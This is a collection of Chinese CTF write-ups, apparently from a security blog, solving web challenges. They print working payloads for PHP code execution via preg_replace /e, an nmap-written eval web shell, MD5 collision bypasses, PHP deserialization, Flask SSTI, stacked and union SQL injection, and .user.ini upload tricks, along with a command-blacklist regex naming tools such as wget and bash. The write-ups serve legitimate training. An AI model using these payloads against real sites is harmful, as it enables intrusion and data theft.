[{"title":"BJDCTF2020之ZJCTF，不过如此","url":"http://example.com/2021/01/27/BJDCTF2020之ZJCTF，不过如此/","content":"知识点\npreg_replace(): The /e modifier is deprecated, use preg_replace_callback instead这个修饰符的意思 就是让 正则替换的 时候 替换规则 支持 php 代码 参考文章：https://xz.aliyun.com/t/2557\n\n解题\n\n分析代码,ge传入两个参数text和file,text参数利用file_get_contents()函数只读形式打开，打开后内容要与”I have a dream”字符串相匹配，才能执行下面的文件包含$file参数。看到用的是file_get_contents()函数打开text参数，以及后面的文件包含函数，自然的想到php伪协议中的data://协议\n构造payload\nindex.php?text=data://text/plain,I have a dream&amp;file=php://filter/convert.base64-encode/resource=next.php\n\n读取到next.php文件的内容\n&lt;?php$id = $_GET[&#x27;id&#x27;];$_SESSION[&#x27;id&#x27;] = $id;function complex($re, $str) &#123;    return preg_replace(        &#x27;/(&#x27; . $re . &#x27;)/ei&#x27;,        &#x27;strtolower(&quot;\\\\1&quot;)&#x27;,        $str    );&#125;foreach($_GET as $re =&gt; $str) &#123;    echo complex($re, $str). &quot;\\n&quot;;&#125;function getFlag()&#123;\t@eval($_GET[&#x27;cmd&#x27;]);&#125;\n\n这里存在  /e  也就是 preg_replace 远程命令执行漏洞。\n思路是利用这个代码执行，执行源码中的getFlag()函数，在传入cmd参数，再利用getFlag中的eval（）函数，再进行一个代码执行。俄罗斯套娃。\n因此 构造 payload\nnext.php?\\S*=$&#123;getFlag()&#125;&amp;cmd=system(&#x27;cat /flag&#x27;);\n\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"GWCTF 2019之我有一个数据库","url":"http://example.com/2021/01/27/GWCTF-2019之我有一个数据库/","content":"知识点\nphpmyadmin 4.8.1 远程文件包含漏洞（CVE-2018-12613）\n解题\n\n打开题目 啥也没有 dirsearch 扫出来一个phpmyadmin的后台，观察版本，phpmyadmin 4.8.1存在任意文件读取漏洞。直接冲\n\n上payload的读取/etc/passwd 读取成功\n\n读取flag\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"安洵杯 2019之easy_web","url":"http://example.com/2021/01/27/安洵杯-2019之1easy-web/","content":"知识点\n\nMD5强类型比较碰撞\na=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2   &amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2\n\n\n\n\n\n\nlinux 命令 混合\\ 仍能正常执行。\n\n解题\n\n一开始 面对 这道题 的思路是 F12 看到 MD5 is funny 然后 url栏 里面 存在 cmd 以为啥 命令执行bypass\n\n尝试了很多命令，发现都没有用，看来我走上了歧途\n看了 别的 大佬的 wp 发现 我忽略了 一个点 这里 还传参了 一个 img尝试 base64 解码\n\n\n\n解码的规律是 base64-&gt;base64-&gt;hex\n尝试逆推得到读取index.php\n这里 还有 一个坑 就是 Hex编码 有带%和不带%两种形式，一开始 不知道，用站长工具做了半天，也没弄出来 很伤 这道题 就是用的不带%的形式\n\n逆推之后 可以 得到index.php的base64 编码的值\n&lt;?phperror_reporting(E_ALL || ~ E_NOTICE);header(&#39;content-type:text&#x2F;html;charset&#x3D;utf-8&#39;);$cmd &#x3D; $_GET[&#39;cmd&#39;];if (!isset($_GET[&#39;img&#39;]) || !isset($_GET[&#39;cmd&#39;]))     header(&#39;Refresh:0;url&#x3D;.&#x2F;index.php?img&#x3D;TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd&#x3D;&#39;);$file &#x3D; hex2bin(base64_decode(base64_decode($_GET[&#39;img&#39;])));$file &#x3D; preg_replace(&quot;&#x2F;[^a-zA-Z0-9.]+&#x2F;&quot;, &quot;&quot;, $file);if (preg_match(&quot;&#x2F;flag&#x2F;i&quot;, $file)) &#123;    echo &#39;&lt;img src &#x3D;&quot;.&#x2F;ctf3.jpeg&quot;&gt;&#39;;    die(&quot;xixi～ no flag&quot;);&#125; else &#123;    $txt &#x3D; base64_encode(file_get_contents($file));    echo &quot;&lt;img src&#x3D;&#39;data:image&#x2F;gif;base64,&quot; . $txt . &quot;&#39;&gt;&lt;&#x2F;img&gt;&quot;;    echo &quot;&lt;br&gt;&quot;;&#125;echo $cmd;echo &quot;&lt;br&gt;&quot;;if (preg_match(&quot;&#x2F;ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\&#39;|\\&quot;|\\&#96;|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\&#123;|\\&#125;|\\(|\\)|\\&amp;[^\\d]|@|\\||\\\\$|\\[|\\]|&#123;|&#125;|\\(|\\)|-|&lt;|&gt;&#x2F;i&quot;, $cmd)) &#123;    echo(&quot;forbid ~&quot;);    echo &quot;&lt;br&gt;&quot;;&#125; else &#123;    if ((string)$_POST[&#39;a&#39;] !&#x3D;&#x3D; (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) &#x3D;&#x3D;&#x3D; md5($_POST[&#39;b&#39;])) &#123;        echo &#96;$cmd&#96;;    &#125; else &#123;        echo (&quot;md5 is funny ~&quot;);    &#125;&#125;?&gt;&lt;html&gt;&lt;style&gt;  body&#123;   background:url(.&#x2F;bj.png)  no-repeat center center;   background-size:cover;   background-attachment:fixed;   background-color:#CCCCCC;&#125;&lt;&#x2F;style&gt;&lt;body&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;\n\n\n过滤的 很严实 GET传参img 只能是大小写 数字 和 点，cmd 命令执行 还被 过滤了 一大堆，而且 要命令执行 还要 MD5 强碰撞，本来数组形式 可以绕过，但是 做了 类型转换 只能强碰撞，强碰撞 方法 就是 比较固定的\na=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2\nbypass 强类型之后 就可以 命令执行 我们 发现 dir 没有被过滤\n\n在 根目录 找到flag文件 并读取，这里 我们 知道 linux 里面 命令 混合\\仍然能 正常执行。\n\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"BUUCTF 2018之Online Tool","url":"http://example.com/2021/01/27/BUUCTF-2018之Online-Tool/","content":"知识点：\n两个函数复用造成命令执行。\n\n这是一道nmap的题，看源码 host 传参 使我们可控的 经过两个函数后 MD5加盐编码之后 得到一个新的MD5值 生成一个 新的目录\n下一步 查看 那两不认识的函数 作用\nescapeshellarg:将参数中的字符串两侧加上&#39;,并将其中的&#39;进行转义 然后在两侧加上&#39;达到拼接的目的\nescapeshellcmd:将参数中的字符串中间的特殊字符转义,并且将落单的&#39;进行转义\n也就是说两个函数连续使用会造成&#39;未被转义,从而触发命令执行\n又看到了 生成 新的目录 ，想到 文件 写入  写入 一句话 木马\n#正常传参 利用 nmap 写入文件?host= &lt;?php eval($_PSOT[&quot;cmd&quot;]);?&gt; -oG cmd.php#经过escapeshellarg?host= &#x27;&lt;?php eval($_PSOT[&quot;cmd&quot;]);?&gt; -oG cmd.php&#x27;#经过escapeshellcmd没啥效果，linux会将&#x27;&#x27;里面的当做字符串，不会解析变量(双引号中的变量仍会解析),这样我们的shell就无法写入#从新传参?host= &#x27;&lt;?php eval($_PSOT[&quot;cmd&quot;]);?&gt; -oG cmd.php&#x27;#经过escapeshellarg?host= &#x27;\\&#x27;&lt;?php eval($_PSOT[&quot;cmd&quot;]);?&gt;&#x27; &#x27;-oG cmd.php\\&#x27; #经过escapeshellcmd?host= &#x27;&#x27;\\\\&#x27;&lt;?php eval($_PSOT[&quot;cmd&quot;]);?&gt;&#x27;&#x27; &#x27;&#x27;-oG cmd.php\\\\&#x27;&#x27;#简化一下?host= \\&lt;?php eval($_PSOT[&quot;cmd&quot;]);?&gt; -oG cmd.php \\\\&#x27;&#x27;达到效果\n\n连接菜刀 拿到flag\n\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"MRCTF2020之Ez_bypass","url":"http://example.com/2021/01/27/MRCTF2020之Ez-bypass/","content":"[MRCTF2020]Ez_bypass知识点\nMD5强类型比较绕过，传入的两个变量均为数组 均为false可以绕过\nis_numeric函数 判断 16进制数 返回也是true 且能被%00截断\n\n解题\n\n打开题目，查看提示\n\n查看源码，存在三处绕过，MD5强类型比较绕过，传入的两个变量均为数组，且是不同的值即可，第二个$_POST传参绕过is_numeric，和“==”一般两种做法 数字结尾拼接不是数字的值，第二种%00截断\n构造payload：\n\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"网鼎杯2020 青龙组之AreUSerialz","url":"http://example.com/2021/01/27/网鼎杯2020-青龙组之AreUSerialz/","content":"知识点\nphp强类型比较，可以通过 不同类型 达到绕过目的\nphp7.1以上版本 对类的类型定义不敏感\nfile_get_contents 伪协议文件读取\n\n&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);class FileHandler &#123;    protected $op;    protected $filename;    protected $content;    function __construct() &#123;        $op = &quot;1&quot;;        $filename = &quot;/tmp/tmpfile&quot;;        $content = &quot;Hello World!&quot;;        $this-&gt;process();    &#125;    public function process() &#123;        if($this-&gt;op == &quot;1&quot;) &#123;            $this-&gt;write();        &#125; else if($this-&gt;op == &quot;2&quot;) &#123;            $res = $this-&gt;read();            $this-&gt;output($res);        &#125; else &#123;            $this-&gt;output(&quot;Bad Hacker!&quot;);        &#125;    &#125;    private function write() &#123;        if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123;            if(strlen((string)$this-&gt;content) &gt; 100) &#123;                $this-&gt;output(&quot;Too long!&quot;);                die();            &#125;            $res = file_put_contents($this-&gt;filename, $this-&gt;content);            if($res) $this-&gt;output(&quot;Successful!&quot;);            else $this-&gt;output(&quot;Failed!&quot;);        &#125; else &#123;            $this-&gt;output(&quot;Failed!&quot;);        &#125;    &#125;    private function read() &#123;        $res = &quot;&quot;;        if(isset($this-&gt;filename)) &#123;            $res = file_get_contents($this-&gt;filename);        &#125;        return $res;    &#125;    private function output($s) &#123;        echo &quot;[Result]: &lt;br&gt;&quot;;        echo $s;    &#125;    function __destruct() &#123;        if($this-&gt;op === &quot;2&quot;)            $this-&gt;op = &quot;1&quot;;        $this-&gt;content = &quot;&quot;;        $this-&gt;process();    &#125;&#125;function is_valid($s) &#123;    for($i = 0; $i &lt; strlen($s); $i++)        if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))            return false;    return true;&#125;if(isset($_GET&#123;&#x27;str&#x27;&#125;)) &#123;    $str = (string)$_GET[&#x27;str&#x27;];    if(is_valid($str)) &#123;        $obj = unserialize($str);    &#125;&#125;\n\n将代码 分段 分析。\nfunction is_valid($s) &#123;    for($i = 0; $i &lt; strlen($s); $i++)        if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))            return false;    return true;&#125;if(isset($_GET&#123;&#x27;str&#x27;&#125;)) &#123;    $str = (string)$_GET[&#x27;str&#x27;];    if(is_valid($str)) &#123;        $obj = unserialize($str);    &#125;&#125;\n\nGET传参，is_valid() 判断字符串的ascii值是否在32~~125之间。存在反序列化函数，调用析构函数。下一步查看析构函数。\nfunction __destruct() &#123;        if($this-&gt;op === &quot;2&quot;)            $this-&gt;op = &quot;1&quot;;        $this-&gt;content = &quot;&quot;;        $this-&gt;process();        &#125;\n\n析构函数 判断 op 强比较 是都 等于 字符型 2  如果等于 替换为 字符型 1.，将content替换为空。 调用process函数。\n public function process() &#123;     if($this-&gt;op == &quot;1&quot;) &#123;         $this-&gt;write();     &#125; else if($this-&gt;op == &quot;2&quot;) &#123;         $res = $this-&gt;read();         $this-&gt;output($res);     &#125; else &#123;         $this-&gt;output(&quot;Bad Hacker!&quot;);     &#125; &#125;private function output($s) &#123;     echo &quot;[Result]: &lt;br&gt;&quot;;     echo $s; &#125;\n\nprocess() 完成读写功能。 我们 应该要使用读取操作 得到flag output() 是输出字符串\nprivate function read() &#123;        $res = &quot;&quot;;        if(isset($this-&gt;filename)) &#123;            $res = file_get_contents($this-&gt;filename);        &#125;        return $res;    &#125;\n\n利用 file_get_contents 来读取 文件 想到 伪协议。\n整理一下思路：\n​    构造序列化字符串，让op=2 并且 利用php伪协议 读取 flag。\nop=2  可以利用 强类型 比较   要比较 类型  2是int型  “2”是string型 可以绕过。\nPHP伪协议：filename=php://filter/read=convert.base64-encode/resource=flag.php\n最后 绕过 那个 ascii码比较函数，因为protected私有化的时候会出现%00 他的ascii的值 是 0 不符合 可以使用php7.1以上版本 对类的类型定义不敏感 改为public绕过。\n构造payload\n\n?str=O:11:&quot;FileHandler&quot;:2:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;&#125;\n\n\n\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"攻防世界之bug","url":"http://example.com/2021/01/27/攻防世界之bug/","content":"\n打开之后是个登陆页面  有 登陆 注册 改密码 功能\n\n\n注册一个test账号 发现Manage点不开提示我不是admin，因此想办法找到admin登陆，这里想到修改密码这个功能 能不能越权修改admin密码。\n\n\n这里填完信息之后，发现身份已经通过，我们可以推测逻辑是 判断身份，然后 修改密码 这时只要能够将test改为admin即可越权修改admin密码了。\n\n将这里的test改为admin成功修改admin密码\n\n\n用xff头 伪造ip 得到提示\n？？？ 尝试 flag 不可以  想到 进后台 要传马  想到upload\n\n上传图片马，然后发现有过滤，然后多次尝试发现 phtml 能够绕过，但是解析不太正常 php4 php5 可以正常  而且 一句话中不能存在 . 而且找不到上传路径 选择直接命令执行。\n\n","categories":["CTF题解"],"tags":["攻防世界"]},{"title":"攻防世界之cat","url":"http://example.com/2021/01/27/攻防世界之cat/","content":"\n\n打开题目 测试提示数据，发现没有反应 看提示 是个网址 就测试127.0.0.1 发现是ping 第一反应 是命令执行\n\n但是行不通 但是 我们发现 url 传参 可以修改 编码值\n\n\n传递%80，url编码使用的是16进制，80也就是128，ASCII码是从0-127，所以这个时候会报错\n查看报错 发现 使用 的是Django\n查找api有关信息\n\n这里存在数据库相关信息。\n尝试访问\n这里要注意：\n\n因此\nhttp://220.249.52.133:30703/index.php?url=@/opt/api/database.sqlite3\n\n\n得到flag。\n","categories":["CTF题解"],"tags":["攻防世界"]},{"title":"攻防世界之shrine","url":"http://example.com/2021/01/27/攻防世界之shrine/","content":"打开题目，好家伙，python，想到ssti模板注入。\nimport flask import os app = flask.Flask(__name__)          #对flask模块进行实例化app.config[&#x27;FLAG&#x27;] = os.environ.pop(&#x27;FLAG&#x27;)    #清除FLAG环境变量，并将其保存在app.config中@app.route(&#x27;/&#x27;) \tdef index():         return open(__file__).read()           #路由转发到/shrine/路径下    \t@app.route(&#x27;/shrine/&#x27;)         def shrine(shrine):     \tdef safe_jinja(s):        \t\ts = s.replace(&#x27;(&#x27;, &#x27;&#x27;).replace(&#x27;)&#x27;, &#x27;&#x27;)         \tblacklist = [&#x27;config&#x27;, &#x27;self&#x27;] \t\t\t\t#过滤 （） ，config，self        \treturn &#x27;&#x27;.join([&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;.format(c) for c in blacklist]) + s     return flask.render_template_string(safe_jinja(shrine)) if __name__ == &#x27;__main__&#x27;:     app.run(debug=True)\n\n根据分析 我们应该在 /shrine/ 路径下查看 app.config[‘FLAG’] 的内容 就能得到flag。\n\nhttp://220.249.52.133:40596/shrine/&#123;&#123;4&#125;&#125;\n\n证明存在  ssti  下一步 想办法 绕过 过滤 读取 信息\n\n/shrine/&#123;&#123;url_for.__globals__&#125;&#125;globals 函数返回一个全局变量的字典，包括所有导入的变量。\n\n\n/shrine/&#123;&#123;url_for.__globals__[&#x27;current_app&#x27;]&#125;&#125;\n\n这个就是之前实例化对象app 查看 他的config即可\n\n/shrine/&#123;&#123;url_for.__globals__[&#x27;current_app&#x27;].config[&#x27;FLAG&#x27;]&#125;&#125;\n\n","categories":["CTF题解"],"tags":["攻防世界"]},{"title":"护网杯2018-easy_tornado","url":"http://example.com/2021/01/27/护网杯2018-easy-tornado/","content":"\n\n打开三个txt文件 获取信息如上\n\n那么接下来 思路就很清晰 只要找到 MD5里面 cookie_secret这个盐值 就可以了\n\n\n在测试url栏传参是发现，还有第四个页面 也就是报错页面，联系题目提示这里可能存在模板注入（因为关于python我知道模板注入）\n\n确认存在模板注入 接下来的思路就是 通过模板注入找到盐值，\n正确的思路就是要去看开发文档，看看什么能够读取cookie_secret\n\nhandler.settings，handler 指向RequestHandler，\n而RequestHandler.settings又指向self.application.settings，\n所以handler.settings就指向RequestHandler.application.settings了\n\n直接获取到盐值\n利用python，加密带盐的MD5值\n\n\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"强网杯 2019-随便注","url":"http://example.com/2021/01/26/强网杯-2019-随便注/","content":"\n\n输入单引号报错，\n\n单引号闭合\n\n两个字段。\n\n好家伙，select给我ban了\n\n\n好家伙内联注释也用不了。\n\n\n堆叠注入可以，查到了库名和表名。\n\n\n分别查询 两个字段里面的信息\n在windows系统下，反单引号（`）是数据库、表、索引、列和别名用的引用符\n分析可知\n\n输出点应该是在 id字段\n\nflag存在于supersqli数据库中的1919810931114514表的flag字段。\n\n\n下面就要开始骚姿势了。\n由于正则字段中的数据是查询不出来了的，只有两种方式，\n\n预编译绕过正则\n\n将flag所在的表和flag都变成words和id 直接查询输出\n\n\n预编译\nset 用于设置变量名和值prepare 用于预备一个语句，并赋予名称，以后可以引用该语句execute 执行语句deallocate prepare 用来释放掉预处理的语句\n\n因此构造payload\nset  @sql&#x3D;CONCAT(&#39;se&#39;,&#39;lect * from &#96;1919810931114514&#96;;&#39;);prepare test from @sql;EXECUTe test;\n\n1&#39;set  @sql=CONCAT(&#39;se&#39;,&#39;lect * from 1919810931114514;&#39;);prepare test from @sql;EXECUTe test;#\n\nstrstr（）函数可以大小写绕过\n修正payload：\n1&#39;;Set @sql &#x3D; CONCAT(&#39;se&#39;,&#39;lect * from &#96;1919810931114514&#96;;&#39;);Prepare test from @sql;EXECUTe test;#\n\n\n得到flag\n修改表名\n修改表名(将表名user改为users)alter table user rename to users;修改列名(将字段名username改为name)alter table users change uesrname name varchar(30);\n\n因此构造payload：\nalert table words rename to 123;alert table &#96;1919810931114514&#96; rename to words;alert table words change flag id int(40);\n\n1&#39;;alert table words rename to     123;alert table &#96;1919810931114514&#96; rename to words;alert table words change flag id varchar(50);#\n\n\n使用1‘ or 1=1 # 得到flag。\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"网鼎杯 2018-Fakebook","url":"http://example.com/2021/01/26/网鼎杯-2018-Fakebook/","content":"\n打开题目注册登录 得到如上界面\n\n查看源码，发现一个view.php\n\n输出单引号报错，可能存在sql注入，进行下一步尝试。\nview.php?no&#x3D;1 and 1&#x3D;1view.php?no&#x3D;1 and 1&#x3D;2view.php?no&#x3D;1 order by 5view.php?no&#x3D;0 union select 666,777,888,999这里发现触发了WAF，尝试内联注释，混淆绕过view.php?no&#x3D;0 &#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F; 666,777,888,999view.php?no&#x3D;0 &#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F; 666,database(),888,999库名：fakebookview.php?no&#x3D;0 &#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F; 1,table_name ,3,4 from information_schema.tables where table_schema&#x3D;&#39;fakebook&#39;表名：usersview.php?no&#x3D;0 &#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F; 1,column_name,3,4 from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;users&#39;字段名：no username passwd dataview.php?no&#x3D;0 &#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F; union&#x2F;**&#x2F;select 1,data,3,4 from fakebook.usersO:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:123;s:4:&quot;blog&quot;;s:12:&quot;ww.baidu.com&quot;;&#125;\n\n得到一个反序列化串\n用dirsearch扫一遍目录啥也没有\n查看robots.txt（常用知识点一定要记住）\n\n下载下来得到 一份源码\n&lt;?phpclass UserInfo&#123;    public $name = &quot;&quot;;    public $age = 0;    public $blog = &quot;&quot;;    public function __construct($name, $age, $blog)  //赋值u    &#123;        $this-&gt;name = $name;        $this-&gt;age = (int)$age;        $this-&gt;blog = $blog;    &#125;    function get($url)  //自定义函数    &#123;\t    \t//初始化 cURL 会话        $ch = curl_init();\t\t//设置url和相对应的选项        curl_setopt($ch, CURLOPT_URL, $url);        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);\t\t//抓取url并把它传递给浏览器        $output = curl_exec($ch);        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);        if($httpCode == 404) &#123;            return 404;        &#125;\t\t//关闭curl资源，并释放系统资源        curl_close($ch);\t        return $output;    &#125;    public function getBlogContents ()    &#123;        return $this-&gt;get($this-&gt;blog);    &#125;    public function isValidBlog ()    &#123;        $blog = $this-&gt;blog;        return preg_match(&quot;/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]&#123;2,6&#125;(\\:[0-9]+)?(\\/\\S*)?$/i&quot;, $blog);    &#125;&#125;\n\n思路明确：利用反序列化和伪协议读取直接flag.php\n\n结合之前的报错信息，可以推测路径为 /var/www/html/flag.php\n因此 写php代码 构建payload\n\n因为data是第四个字段 因此最终的payload为\nhttp://b5de29d4-cf0b-47f7-a63d-7edf1fc2a2c4.node3.buuoj.cn/view.php?no=0%20union/**/select%201,2,3,%27O:8:%22UserInfo%22:3:&#123;s:4:%22name%22;s:5:%22admin%22;s:3:%22age%22;i:123;s:4:%22blog%22;s:29:%22file:///var/www/html/flag.php%22;&#125;%27\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"ZJCTF 2019-NiZhuanSiWei","url":"http://example.com/2021/01/26/ZJCTF-2019-NiZhuanSiWei/","content":"知识点php伪协议\nhttps://www.anquanke.com/post/id/202510#h3-3\nhttps://www.cherrygk.cn/2018/07/12/phpagree/\n解题\n审计代码，需要 txt  file password三个参数，分段绕过\nif(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)===&quot;welcome to the zjctf&quot;))\n这里需要我们对text传参，并让file_get_contents()函数读取内容为 welcome to the zjctf\n因此使用 ?text=data:text/plain,welcome to the zjctfdata://伪协议实现绕过。\n\n过滤了 关键字flag\n\n这里提示读取useless.php，因此file=useless.php。但是php文件会被解析不能输出，因此，用base64编码读取\nphp://filter/read=convert.base64-encode/resource=useless.php\n\n读取到useless.php内容\n\n反手写一个反序列化生成payload：\npassword=O:4:&quot;Flag&quot;:2:&#123;s:4:&quot;file&quot;;N;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;&#125;\n最终payload\n?text=data:text/plain,welcome%20to%20the%20zjctf&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;\n\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"BJDCTF2020 EasyMD5","url":"http://example.com/2021/01/26/BJDCTF2020-EasyMD5/","content":"知识点：MD5 \n\nmd5 bypass\nmd5()或者sha1()之类的函数计算的是一个字符串的哈希值，对于数组则返回false，如果都是数组则双双返回FALSE, 两个FALSE相等得以绕过\n解题：\n\n\n输入框传参会是GET传参，查看返回包请求头发现提示，这里尝试了很多次这里我都绕不过去，一次看博客得到：\n传参?password=ffifdyop\n原理：\n经过md5加密后：276f722736c95d99e921722cf9ed621c，Mysql 刚好又会吧 hex 转成 ascii 解释，再转换为字符串：’or’6&lt;乱码&gt; 即  &#39;or&#39;66�]��!r,��b 起始。只要是万能密码就行可以采用md5截断爆破，但是我命不好跑了半小时没跑出来 就直接用网上师傅们的了。\n用途：\nselect * from admin where password=&#39;&#39;or&#39;6&lt;乱码&gt;&#39;\n就相当于select * from admin where password=&#39;&#39;or 1 实现sql注入\n\n查看源码，发现需要md5弱类型比较，有两种做法\n第一种弱类型 传入连个0e…的值e后面的会被当做科学计数法 0 = 0 实现绕过\n第二种数组编码之后会返回false false=false 实现绕过\n\n===弱类型不可以了，但是可以第二种方法\n\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"UNCTF之easyunserialize","url":"http://example.com/2021/01/26/UNCTF之easyunserialize/","content":"知识点：PHP 在反序列化时，底层代码是以;作为字段的分隔，以&#125;作为结尾(数组、对象等类型)；反序列化时，结尾后的字符串会被忽略掉，当出现字符串替换函数得时候，就可以存在反序列化逃逸漏洞\n当替换后字符变多：由于膨胀，导致后面的字符被挤掉，所以执行我们传入的代码\n当替换后字符变少：由于缩水，导致前面的字符被吃掉了，所以执行了我们后面构造的代码\n解题：\n经过分析，构造payload。\n\n;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;\n得到我们要传入的参数（起始也可以直接写出来要是熟悉的话）\n我们发现这串字符有 29个。而我们根据替换只能控制溢出为4的倍数，因此这里有个骚姿势传入一个没有用的参数，使得我们构造的传参为4的倍数\npaylaod：&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;s:5:&quot;aaaaa&quot;;s:4:&quot;easy&quot;;&#125;\n此时是52个字符为4的倍数，构造脚本。\n\n\n","categories":["CTF题解"],"tags":["UNCTF"]},{"title":"# BUUCTF之[极客大挑战 2019]BuyFlag","url":"http://example.com/2021/01/26/BUUCTF之-极客大挑战-2019-BuyFlag/","content":"知识点is_numberic:可以使用%00和%20绕过\nstrcmp()：这一个漏洞适用与5.3之前版本的php\nstrcmp(&#x27;str1&#x27;,&#x27;str2&#x27;)    if(str1&gt;str2) return &gt;0    if(str1&lt;str2) return &lt;0    if(str1 == str2) return 0    if(str1 = arry[] &amp;&amp; str2 = string) return 0\n\n\n\n解题\n打开题目 打开payflag的功能菜单，提示flag需要100000000 money\n\n结合上述提示可知 获得flag需要三个步骤\n1.a student from CUIT\n2.输入正确的密码\n3.输入正确的金额\n第一点是身份验证，可以看一下cookie\n](https://imgchr.com/i/sjNmZT)\n可以发现cookie很简单 就是user=0 因此是不是可以推测 user=1就可以完成CUIT的身份确认\n\n查看源码发现这里有对密码的提示，\n\n根据审计可知 要绕过is_number函数 且 password值为404 所以 POST传参为：password=404%00\n\n依次修改cookie和POST传参，\n\n下一步就是要传入money的值\n\n这里提示数字太长了，因此我们可以推测可能是strcmp比较，\n\n抓个包 发现php版本为5.3.3 可以使用 数组绕过\n\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"BUUCTF之[SUCTF 2019]CheckIn","url":"http://example.com/2021/01/26/BUUCTF之-SUCTF-2019-CheckIn/","content":"知识点.user.ini 是什么？​        .user.ini实际上就是自定义的php.ini.通过使用两个方法auto_prepend_file、auto_append_file实现类似于文件包含的功能。\n使用条件：(1)服务器脚本语言为PHP(2)对应目录下面有可执行的php文件(3)服务器使用CGI／FastCGI模式\n解题\n打开图片上传一个正常的 .png 的图片 观察返回的信息 返回了目录路径 返回了当前文件夹存在的 东西\n\n上传图片马 发现 会对图片信息进行  过滤和查看  。  这里 &lt;? 被过滤了 只能换一个 马\n&lt;script language=&quot;pHp&quot;&gt;@eval($_POST[8])&lt;/script&gt;\n\n经过测试 几乎所有后缀 名 全被ban了，只能想想骚姿势\n\n正常不修改文件后缀，可以上传图片马，因此可以使用之前提到的 .user.ini 将图片马 包含到 已经存在的 index.php 里面 。\n\n第一次上传失败了  原因是 不是图片  一次 在构造时 加上一个图片识别的前缀\n\n\n这样就成功上传，可以去 快落的连接蚁剑了。\n\n连接成功 得到flag。\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"BUUCTF之[HCTF 2018]admin","url":"http://example.com/2021/01/26/BUUCTF之-HCTF-2018-admin/","content":"知识点flask–session存储机制\n实现\nfrom datetime import timedeltafrom flask import Flask, request, redirect, url_for, sessionapp = Flask(__name__)#设置我们的秘钥 用于对sessionid进行加密app.secret_key=&quot;lH4WHi5amT0ZqykHvLofllRJu3UN1uzmeUN0z2IiacjDUb5TLU3ZTtUP5VJqgkMY&quot;#设置session的过期时间app.permanent_session_lifetime = timedelta(days=7)\n\n调用\n@app.route(&#x27;/&#x27;)def index():    #访问首页时 如果是登录状态 则 提示欢迎信息    username = session.get(&quot;username&quot;)    if username:        #删除session的数据        return &quot;欢迎回来%s&quot;%username    #如果没有登录 跳转到登录页面    return redirect(url_for(&quot;login&quot;))#登录的路由@app.route(&#x27;/login&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def login():    if request.method == &#x27;GET&#x27;:        with open(&quot;login.html&quot;) as f:            login_html_content = f.read()            return login_html_content    